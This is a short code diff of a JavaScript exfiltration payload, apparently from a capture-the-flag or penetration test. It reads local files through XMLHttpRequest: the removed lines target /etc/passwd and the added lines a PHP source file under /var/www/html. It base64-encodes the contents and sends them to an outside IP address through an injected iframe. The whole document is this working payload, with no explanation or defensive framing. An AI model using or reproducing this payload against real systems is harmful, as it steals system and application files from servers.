@@ -1,8 +1,8 @@
 function reqListener () {
 var b64 = btoa(this.responseText);
-document.write(‘<iframe src=”http://34.93.239.168:8080?a='+b64+'"></iframe>');
+document.write('<iframe src="http://34.93.239.168:8080/?a='+b64+'"></iframe>');
 } 
 var req = new XMLHttpRequest(); 
-req.addEventListener(“load”, reqListener); 
-req.open(“GET”, “file:///etc/passwd”); 
+req.addEventListener("load", reqListener); 
+req.open("GET", "file:///var/www/html/topdev_salary/card.php"); 
 req.send();
